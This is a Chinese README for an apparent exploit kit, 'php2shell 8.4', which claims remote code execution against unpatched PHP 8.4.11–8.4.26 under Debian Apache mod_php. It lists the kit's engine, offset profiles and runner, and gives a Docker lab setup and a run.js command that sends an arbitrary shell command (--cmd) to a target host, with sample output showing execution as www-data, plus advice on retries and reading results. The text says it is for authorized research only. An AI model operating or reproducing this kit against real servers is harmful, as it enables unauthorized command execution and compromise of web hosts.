# php2shell 8.4 — Debian Apache（mod_php）

这是针对 **未修复的 PHP 8.4** 的 16 个可用 exploit，目标环境限定为
**Debian + Apache mod_php**（`apache2handler`），使用
`php.ini-production` 配置。

> **仅限授权使用。** 只能在自有实验环境或获得书面授权的目标上运行。
> 成功标准是目标上出现 proof 文件；没有 proof 文件就**不是** RCE。

语言：[pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




我们从最初的漏洞公告出发独立研究，在实验室构建了 PoC，随后专注于在生产容器中实现利用。

## 覆盖版本（16）

| 范围 | 版本 | stage 3 的 `s_off` |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16 个版本 | `0xF8398` |

## 仓库内容

```text
engine/pure_fixed.js     A1→B1→A2→B2 引擎
profiles/*.json          16 个构建 profile：符号、s_off、前置条件
run.js                   选择 profile 并运行引擎
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   校验 16 个 profile
```

并且必须提供 proof 文件。

## 环境要求

- 操作端 Node.js 20+。
- 目标实验环境安装 Docker。
- 官方 `php:<version>-apache`（Debian）镜像，并挂载 `target/php.ini` 与
  `target/apache.conf`。
- 为 proof 提供共享卷（目标上的 `/out`）。

## 快速开始（本地实验）

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

把 `8.4.26` 换成任意覆盖版本，并同步修改镜像 tag。

## 结果解读

| 输出 | 含义 |
|:--|:--|
| `out/p1` 包含 `uid=...` | 已证明代码执行 |
| 引擎提示 proof，但文件为空 | **不是 RCE**，执行失败 |
| `leak failed` / `no proof` | 未执行；重启目标后重试 |

每次尝试都应从干净的 worker 开始。`run.js` 不会替你重启容器；复现矩阵时
请在两次尝试之间重启目标。

## 真实限制

- 权限是 `www-data`，不是 root。
- 结果依赖镜像的精确构建；复现时请固定 tag/digest。

## 测试

```bash
node --test
```

## 文档

- `docs/como-reproduzir.md` — 逐步操作与排错（pt-BR）。

## 声明

本材料仅用于授权的安全研究。未经许可，不得用于第三方系统。使用者对
使用后果负责。